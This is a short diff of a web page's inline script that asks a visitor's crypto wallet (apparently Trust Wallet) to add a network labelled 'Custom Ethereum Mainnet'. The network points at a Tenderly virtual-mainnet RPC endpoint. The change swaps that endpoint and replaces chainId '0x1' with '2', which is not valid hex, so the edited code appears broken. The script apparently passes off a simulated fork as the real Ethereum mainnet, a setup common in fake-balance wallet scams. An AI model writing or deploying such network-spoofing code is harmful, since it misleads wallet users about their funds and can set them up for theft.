@@ -14,7 +14,7 @@
 
   <script>
     // Custom Ethereum RPC for Trust Wallet
-    const customRPC = 'https://virtual.mainnet.rpc.tenderly.co/b9310f1f-843b-47cf-aad6-354180199c6d';
+    const customRPC = 'wss://virtual.mainnet.rpc.tenderly.co/cec45961-1135-47df-a804-8cf4c00f9197';
 
     async function overrideEthereumMainnet() {
         try {
@@ -25,7 +25,7 @@
                     await window.ethereum.request({
                         method: 'wallet_addEthereumChain',
                         params: [{
-                            chainId: '0x1',
+                            chainId: '2',
                             chainName: 'Custom Ethereum Mainnet',
                             rpcUrls: [customRPC],
                             nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
